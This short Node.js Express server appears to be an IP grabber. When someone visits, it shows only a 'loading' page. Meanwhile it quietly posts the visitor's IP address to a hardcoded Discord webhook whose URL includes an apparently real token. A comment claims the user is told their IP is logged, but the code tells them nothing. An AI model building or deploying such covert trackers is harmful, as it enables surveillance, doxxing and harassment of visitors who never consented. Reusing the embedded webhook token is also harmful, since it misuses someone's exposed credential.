const express = require('express');
const fetch = require('node-fetch'); // or use native fetch in Node 18+
const app = express();

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1441910971583955096/lB5pL8eiU_UccEKYVt11qdh3Jp1HaG4kNlnPR87q1slqf3tdiXUIREIrVYsz7ZiW44gV';

app.get('/', async (req, res) => {
    // Get user's IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Notify user their IP is being logged
    res.send(`
        <h1>loading</h1>
    `);

    // Send IP to Discord webhook
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `User IP: ${ip}` })
        });
    } catch (err) {
        console.error('Error sending to Discord:', err);
    }
});

app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
